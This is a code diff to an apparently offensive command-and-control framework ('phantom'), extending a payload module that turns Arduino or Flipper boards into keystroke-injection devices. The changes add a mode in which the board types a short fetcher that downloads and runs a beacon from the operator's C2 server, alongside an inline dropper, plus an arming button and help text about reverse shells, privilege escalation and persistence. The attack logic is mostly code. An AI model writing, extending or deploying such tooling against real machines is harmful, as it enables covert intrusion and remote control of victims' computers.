@@ -115,8 +115,8 @@ class PayloadModule(BaseModule):
                 "CORE": ["generate", "reverse [lhost] [lport]",
                           "bind [port]", "deploy", "privesc"],
                 "DELIVERY": ["hid <board> [\"<command>\" | --from-payload <id> | "
-                             "--stager <os>] [--type-into <os>] "
-                             "[--out <file>]"],
+                             "--stager <os>] [--stager-mode <m>] "
+                             "[--type-into <os>] [--out <file>]"],
                 "LISTENER": ["handler <port> <payload>"],
             },
             self.suggest_commands(),
@@ -295,6 +295,20 @@ class PayloadModule(BaseModule):
                           scheduled task / POSIX cron) so the beacon still
                           lands once the C2 comes up — the operator types
                           it once and walks away.
+          --stager-mode <m>
+                          HOW --stager is delivered. `download` (default)
+                          types a ~300-char fetcher and the C2 serves the
+                          beacon; `inline` types the full one-liner (~11.4k
+                          chars on Windows). HID is the one channel where
+                          the LENGTH is the cost — the board types every
+                          character on screen — so download is the default
+                          HERE. The paste-a-command channels (`generate`,
+                          `exploit`) keep their inline dropper: nothing is
+                          typed there, so an inline one-liner costs them
+                          nothing and they are not affected by this.
+                          Both modes fetch the SAME artefact from the same
+                          C2 route, so switching does not change what lands
+                          on the target.
           --strict        refuse (instead of asking) when the command does
                           not match --type-into
           --out <file>    where to write the artefact (default:
@@ -302,6 +316,12 @@ class PayloadModule(BaseModule):
           --delay <ms>    wait before typing (default 1500: the host has to
                           enumerate the HID device first)
           --no-enter      do not press Enter after the command
+          --arm           Arduino only: require TWO presses of a button on
+                          --arm-pin before the board types. Off by default:
+                          without it the board types the moment it is powered,
+                          so unplug it before flashing (or it fires on THIS
+                          machine). Use it if you reflash often in place.
+          --arm-pin <n>   pin the arm button is on (default 7)
           --run           open a console first (one chord per target:
                           Win+R on Windows, Ctrl+Alt+T on Linux,
                           Cmd+Space on macOS)
@@ -322,6 +342,8 @@ class PayloadModule(BaseModule):
           payload hid arduino --from-payload 3f2a91c4 --type-into windows
           payload hid arduino --stager windows --type-into windows --run \\
               --layout it
+          payload hid flipper --stager linux --type-into linux \\
+              --stager-mode inline
           payload hid leonardo --from-payload 3f2a91c4 --type-into windows \\
               --flash COM5 --fqbn arduino:avr:leonardo
         """
@@ -336,11 +358,14 @@ class PayloadModule(BaseModule):
         target = ""
         from_payload = ""
         stager = ""
+        stager_mode = ""
         layout = "us"
         out = ""
         delay_ms = 1500
         press_enter = True
         open_run = False
+        arm = False
+        arm_pin = 7
         flash = ""
         fqbn = ""
         arduino_cli = ""
@@ -368,6 +393,19 @@ class PayloadModule(BaseModule):
                 continue
             if tok == "--stager" and i + 1 < len(parts):
                 stager = parts[i + 1].lower()
+                i += 2
+                continue
+            if tok == "--stager-mode":
+                if i + 1 >= len(parts):
+                    notifier.error("--stager-mode wants download or inline")
+                    return
+                stager_mode = parts[i + 1].lower()
+                if stager_mode not in ("download", "inline"):
+                    notifier.error(
+                        f"unknown --stager-mode '{stager_mode}': download "
+                        f"lets the C2 serve the beacon (short — the HID "
+                        f"default), inline types the whole one-liner")
+                    return
                 i += 2
                 continue
             if tok == "--layout" and i + 1 < len(parts):
@@ -406,6 +444,18 @@ class PayloadModule(BaseModule):
                 open_run = True
                 i += 1
                 continue
+            if tok == "--arm":
+                arm = True
+                i += 1
+                continue
+            if tok == "--arm-pin" and i + 1 < len(parts):
+                try:
+                    arm_pin = int(parts[i + 1])
+                except ValueError:
+                    notifier.error("--arm-pin wants a pin number")
+                    return
+                i += 2
+                continue
             if tok == "--strict":
                 strict = True
                 i += 1
@@ -443,6 +493,17 @@ class PayloadModule(BaseModule):
             notifier.error("--from-payload uses the command that already "
                            "exists and --stager builds a new one: pick one.")
             return
+        if stager_mode and not stager:
+            notifier.error("--stager-mode decides how --stager is delivered: "
+                           "pass --stager <os> with it.")
+            return
+        if not stager_mode:
+            # HID DEFAULT: the board types a FETCHER and the C2 serves the
+            # beacon. The channels that paste a command (generate, exploit,
+            # c2) never reach this flag — nothing is typed for them, so an
+            # inline one-liner costs them nothing and their default is
+            # unchanged.
+            stager_mode = "download"
         if from_payload and command:
             notifier.error(
                 "--from-payload plus an inline command is two sources for one "
@@ -493,16 +554,38 @@ class PayloadModule(BaseModule):
                     f"--stager {stager} but the board types into {target}: "
                     f"one artefact, and PE ≠ ELF ≠ Mach-O — pick one.")
                 return
-            from phantom.utils.builder import generate_dropper
             from phantom.utils import config as cfg
             host = session.lhost or self._get_lhost()
             port = cfg.get_int("c2.port", 8080, env="PHANTOM_C2_PORT")
-            command = generate_dropper(stager, host, port, use_ssl=True,
-                                       resilient=True)
+            if stager_mode == "download":
+                # The board types every character ON SCREEN, which is the
+                # whole reason this branch exists: the inline Windows stager
+                # is ~11.4k chars — minutes of typing, with the Run dialog's
+                # own length limit in the way. A download stager types a
+                # ~300-char fetcher and the C2 serves the beacon from the
+                # SAME route the inline dropper fetches from, so the artefact
+                # is byte-identical either way.
+                from phantom.utils import short_stager as ss
+                from phantom.utils.c2_crypto import get_payload_token
+                try:
+                    command = ss.hid_download_command(
+                        stager, host, port, token=get_payload_token(),
+                        ssl=True)
+                except ValueError as exc:
+                    notifier.error(str(exc))
+                    return
+                notifier.info(f"download stager for {stager}: {len(command)} "
+                              f"chars typed, the C2 at {host}:{port} serves "
+                              f"the beacon")
+            else:
+                from phantom.utils.builder import generate_dropper
+                command = generate_dropper(stager, host, port, use_ssl=True,
+                                           resilient=True)
+                notifier.info(f"inline stager for {stager} built with the "
+                              f"current C2 endpoint ({host}:{port}): "
+                              f"{len(command)} chars will be typed")
             target = target or stager
             payload_platform = payload_platform or stager
-            notifier.info(f"stager for {stager} built with the current C2 "
-                          f"endpoint ({host}:{port})")
         if not command:
             notifier.error("hid wants the command to type (or --from-payload "
                            "<id>, or --stager <os>)")
@@ -545,7 +628,8 @@ class PayloadModule(BaseModule):
                                         layout=layout,
                                         delay_ms=delay_ms,
                                         press_enter=press_enter,
-                                        open_run=open_run)
+                                        open_run=open_run,
+                                        arm=arm, arm_pin=arm_pin)
         except ValueError as exc:
             notifier.error(str(exc))
             return
@@ -569,6 +653,16 @@ class PayloadModule(BaseModule):
         for note in board_notes(board):
             notifier.info(note)
         if flash:
+            if board in ARDUINO_BOARDS and not arm:
+                # The Leonardo resets into setup() the moment the upload
+                # finishes, so a board still plugged into the machine you are
+                # sitting at types on THAT machine. This is not a corner
+                # case, it is what happens on every in-place reflash.
+                notifier.warn(
+                    "this board types as soon as it is powered, and the "
+                    f"upload just ran it on THIS machine ({flash}). Unplug it "
+                    "now if you did not mean to type here; --arm prevents it "
+                    "at the cost of a button on --arm-pin.")
             from phantom.utils.arduino_flash import (
                 DEFAULT_FQBN, flash_sketch, fqbn_for)
             notifier.status(f"Flashing {os.path.basename(out)} to {flash} "
